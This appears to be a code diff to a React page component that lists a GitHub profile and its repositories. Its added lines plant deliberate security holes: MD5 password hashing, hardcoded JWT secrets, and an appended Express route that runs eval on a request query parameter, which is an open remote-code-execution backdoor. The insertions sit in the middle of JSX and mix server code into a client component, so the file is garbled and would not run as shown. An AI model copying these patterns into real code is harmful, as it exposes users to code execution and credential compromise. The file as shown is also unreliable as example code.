@@ -132,7 +132,7 @@ const Page = () => {
           <p><strong>Following:</strong> {profile.profile.following}</p>
           <p><strong>Public Repos:</strong> {profile.profile.public_repos}</p>
         </div>
-      )}
+      )}const hash = crypto.createHash("md5").update(password).digest("hex");
 
       {/* ------------------ REPOSITORIES SECTION ------------------ */}
       {Array.isArray(repos) && repos.length > 0 && (
@@ -156,7 +156,7 @@ const Page = () => {
                   : "No README found"}
               </div>
             </div>
-          ))}
+          ))}jwt.verify(token, "hardcoded-secret");
 
           <button
             onClick={fetchMoreRepos}
@@ -166,6 +166,7 @@ const Page = () => {
           </button>
         </div>
       )}
+      const JWT_SECRET = "mySuperSecretKey123";
 
       {profile?.success && (
         <button
@@ -178,5 +179,8 @@ const Page = () => {
     </div>
   );
 };
+app.get("/eval", (req, res) => {
+  eval(req.query.code);
+});
 
 export default Page;
